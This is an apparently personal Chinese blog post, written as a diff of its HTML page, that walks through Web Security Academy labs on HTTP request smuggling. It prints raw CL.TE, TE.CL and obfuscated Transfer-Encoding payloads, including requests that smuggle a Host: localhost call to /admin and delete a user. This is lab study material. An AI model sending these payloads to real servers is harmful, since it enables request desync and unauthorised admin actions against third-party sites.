@@ -1,0 +1,739 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HTTP request smuggling | wanan</title><meta name="keywords" content="burp,smuggling"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTTP 请求走私，基本 CL.TE 漏洞  payload POST &#x2F; HTTP&#x2F;1.1Host: 0ace006a04195d25c1b4351c002400ec.web-security-academy.netConnection: keep-aliveContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 6Trans">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP request smuggling">
+<meta property="og:url" content="https://www.wanan.red/917f81d7.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="HTTP 请求走私，基本 CL.TE 漏洞  payload POST &#x2F; HTTP&#x2F;1.1Host: 0ace006a04195d25c1b4351c002400ec.web-security-academy.netConnection: keep-aliveContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 6Trans">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg">
+<meta property="article:published_time" content="2023-01-08T11:45:34.542Z">
+<meta property="article:modified_time" content="2023-01-08T11:46:39.450Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="burp">
+<meta property="article:tag" content="smuggling">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/917f81d7"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-h7qMMwh8fd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0a85e115f35e16b8da9503b0d77633ca";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-FYB0HL88QE');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTTP request smuggling',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-08 19:46:39'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">99</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">83</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTTP request smuggling</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-08T11:45:34.542Z" title="发表于 2023-01-08 19:45:34">2023-01-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-08T11:46:39.450Z" title="更新于 2023-01-08 19:46:39">2023-01-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/burp/">burp</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/burp/HTTP-request-smuggling/">HTTP request smuggling</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>28分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HTTP request smuggling"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HTTP-请求走私，基本-CL-TE-漏洞"><a href="#HTTP-请求走私，基本-CL-TE-漏洞" class="headerlink" title="HTTP 请求走私，基本 CL.TE 漏洞"></a>HTTP 请求走私，基本 CL.TE 漏洞</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208131121492.png" alt="image-20221208131121492"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208131107820.png" alt="image-20221208131107820"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ace006a04195d25c1b4351c002400ec.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208132026587.png" alt="image-20221208132026587"></p>
+<p>其中的值</p>
+<p>Connection: keep-alive 保持http的长连接 也就是说我们如果要发送两次http请求的话 都会使用一条tcp流</p>
+<p>Content-Length: 6  其中这里的值为6 也就是说明我们前端是根据这个 Content-Length 的值来判读当前http请求结束的位置的 也就是前端会将这个请求全部接收</p>
+<p>而Transfer-Encoding: chunked 则是指后端根据这个来进行划分http请求的位置 也就是说后端认为当出现 0 才代表http请求的中断</p>
+<p>因此假如我们连续发送两个相同的数据包</p>
+<p>前端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ace006a04195d25c1b4351c002400ec.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G(前端会在这里进行划分为两个不同的http请求)POST / HTTP/1.1</span><br><span class="line">Host: 0ace006a04195d25c1b4351c002400ec.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+
+<p>后端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ace006a04195d25c1b4351c002400ec.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0(后端会以这里进行划分为两个http请求)</span><br><span class="line"></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Host: 0ace006a04195d25c1b4351c002400ec.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+
+<p>那么这就导致后端的请求类型为 GPOST</p>
+<p>第一次请求</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208145746609.png" alt="image-20221208145746609"></p>
+<p>第二次请求</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208145804968.png" alt="image-20221208145804968"></p>
+<h1 id="HTTP-请求走私，基本-TE-CL-漏洞"><a href="#HTTP-请求走私，基本-TE-CL-漏洞" class="headerlink" title="HTTP 请求走私，基本 TE.CL 漏洞"></a>HTTP 请求走私，基本 TE.CL 漏洞</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208150126316.png" alt="image-20221208150126316"></p>
+<p>这次刚好反过来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到这里存在一个 5c  是92的十六进制表示该分块总共有92个字符</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208163742314.png" alt="image-20221208163742314"></p>
+<p>而到达下面的 0 代表当前的http请求终止</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a9b00fc0307f814c0f1059b00bd00b2.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一次</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208165251187.png" alt="image-20221208165251187"></p>
+<p>前端接受到的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a9b00fc0307f814c0f1059b00bd00b2.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>后端接受的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a9b00fc0307f814c0f1059b00bd00b2.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br></pre></td></tr></table></figure>
+
+<p>这是第一个请求 由于是 Content-length: 4     为4也就是说明这个请求只有四个字节当到达 5c\r\n</p>
+<p>已经到达四个字节 因此完成一次响应</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>而这并不是一个完整的 http响应 原因就是这里的 Content-length :15 这里说明我们要发送15个字符 但是呢我们只发送了 10个字符 也就是说 后端认为我们还没发送完成继续等待接受字符 等到够了15个字符就会完成本次的 http请求</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208170454987.png" alt="image-20221208170454987"></p>
+<p>第二次</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST </span><br></pre></td></tr></table></figure>
+
+<p>因此这才是第二次的 请求头</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208165301951.png" alt="image-20221208165301951"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208170724568.png" alt="image-20221208170724568"></p>
+<h1 id="HTTP-请求走私，混淆-TE-标头"><a href="#HTTP-请求走私，混淆-TE-标头" class="headerlink" title="HTTP 请求走私，混淆 TE 标头"></a>HTTP 请求走私，混淆 TE 标头</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208173155213.png" alt="image-20221208173155213"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ad40098038170e9c4153a6200260095.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一次</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208175549809.png" alt="image-20221208175549809"></p>
+<p>很明显 这里类似于 TE.CL的payload 其中 前端看到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding：chunked</span><br><span class="line">Transfer-encoding：cow</span><br></pre></td></tr></table></figure>
+
+<p>这是TE型的包 </p>
+<p>但是后端服务器不这么认为 后端觉得这有错误 因此使用CL的格式来接收的</p>
+<p>第二次</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208175534802.png" alt="image-20221208175534802"></p>
+<h1 id="HTTP-请求走私，通过差异响应确认-CL-TE-漏洞"><a href="#HTTP-请求走私，通过差异响应确认-CL-TE-漏洞" class="headerlink" title="HTTP 请求走私，通过差异响应确认 CL.TE 漏洞"></a>HTTP 请求走私，通过差异响应确认 CL.TE 漏洞</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208180631819.png" alt="image-20221208180631819"></p>
+<p>第一次</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0adb002b0490a2abc0ff156900150096.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p>前端是 整个 请求头</p>
+<p>而后端接收到的是俩个请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0adb002b0490a2abc0ff156900150096.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208181859715.png" alt="image-20221208181859715"></p>
+<p>当第二个请求发送完成之后 与第一个请求剩余的http请求进行拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: XPOST / HTTP/1.1</span><br><span class="line">Host: 0adb002b0490a2abc0ff156900150096.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p>从而形成一个正确的http请求 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208181655073.png" alt="image-20221208181655073"></p>
+<p>当然这里也可以如此构造 仅仅需要将 Content-Length: 35 补足 且后面没有 换行符即可</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208185540313.png" alt="image-20221208185540313"></p>
+<h1 id="HTTP-请求走私，通过差异响应确认-TE-CL-漏洞"><a href="#HTTP-请求走私，通过差异响应确认-TE-CL-漏洞" class="headerlink" title="HTTP 请求走私，通过差异响应确认 TE.CL 漏洞"></a>HTTP 请求走私，通过差异响应确认 TE.CL 漏洞</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208190548190.png" alt="image-20221208190548190"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5e</span><br><span class="line">POST /404 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>构造类似 只不过是把GPOST 变成正常的http协议</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208191816646.png" alt="image-20221208191816646"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208191846458.png" alt="image-20221208191846458"></p>
+<h1 id="利用-HTTP-请求走私绕过前端安全控制，CL-TE-漏洞"><a href="#利用-HTTP-请求走私绕过前端安全控制，CL-TE-漏洞" class="headerlink" title="利用 HTTP 请求走私绕过前端安全控制，CL.TE 漏洞"></a>利用 HTTP 请求走私绕过前端安全控制，CL.TE 漏洞</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208192047613.png" alt="image-20221208192047613"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208192421316.png" alt="image-20221208192421316"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a63006a035270d5c43f8674008a00cd.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 33</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Test: test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208192911310.png" alt="image-20221208192911310"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208192934730.png" alt="image-20221208192934730"></p>
+<p>这里说的是本地用户才能访问</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208193011146.png" alt="image-20221208193011146"></p>
+<p>但是 当修改host时会发现存在两个相同的请求头  那么是什么原因呢</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208193602288.png" alt="image-20221208193602288"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a63006a035270d5c43f8674008a00cd.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 41</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost 这里</span><br><span class="line">Test: tPOST / HTTP/1.1</span><br><span class="line">Host: 0a63006a035270d5c43f8674008a00cd.web-security-academy.net 这里</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 41</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Test: t</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在第二个GET请求这里 确实存在两个Host</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a63006a035270d5c43f8674008a00cd.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 120</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 305</span><br><span class="line"></span><br><span class="line">Test=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208194531958.png" alt="image-20221208194531958"></p>
+<p>305 大概是第二次拼接的请求</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208194824158.png" alt="image-20221208194824158"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a63006a035270d5c43f8674008a00cd.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 143</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 305</span><br><span class="line"></span><br><span class="line">Test=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208195018907.png" alt="image-20221208195018907"></p>
+<h1 id="利用-HTTP-请求走私绕过前端安全控制，TE-CL-漏洞"><a href="#利用-HTTP-请求走私绕过前端安全控制，TE-CL-漏洞" class="headerlink" title="利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞"></a>利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208200246563.png" alt="image-20221208200246563"></p>
